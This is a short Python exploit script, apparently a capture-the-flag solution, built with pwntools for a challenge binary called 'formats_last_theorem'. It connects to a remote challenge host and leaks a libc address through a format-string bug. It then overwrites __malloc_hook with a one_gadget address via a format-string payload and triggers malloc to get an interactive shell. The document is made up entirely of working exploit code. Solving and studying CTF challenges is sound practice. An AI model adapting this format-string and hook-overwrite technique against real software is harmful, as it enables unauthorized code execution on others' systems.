from pwn import *

elf = ELF('./formats_last_theorem')
context.binary = elf
libc = ELF('./libc6_2.27-3ubuntu1.4_amd64.so')

#s = process('./formats_last_theorem')
s = remote('dctf-chall-formats-last-theorem.westeurope.azurecontainer.io', 7482)

s.sendlineafter('point\n', '%23$p')
s.recvline()    # recieve 'you entered\n'

__libc_start_main_ret = int(s.recvline()[:-1], 16)
libc_address = __libc_start_main_ret - 0x021bf7
libc.address = libc_address
print('libc_address', hex(libc_address))

one_gadgets = [0x4f3d5, 0x4f432, 0x10a41c]
#one_gadget = libc_address + one_gadgets[0] 
one_gadget = libc_address + one_gadgets[1] 
#one_gadget = libc_address + one_gadgets[2] 

print('one_gadget', hex(one_gadget))

payload = fmtstr_payload(6, {libc.symbols.__malloc_hook:one_gadget}, numbwritten=0, write_size='short')
s.sendlineafter('point\n', payload)
s.sendlineafter('point\n', '%65536c')

s.interactive()

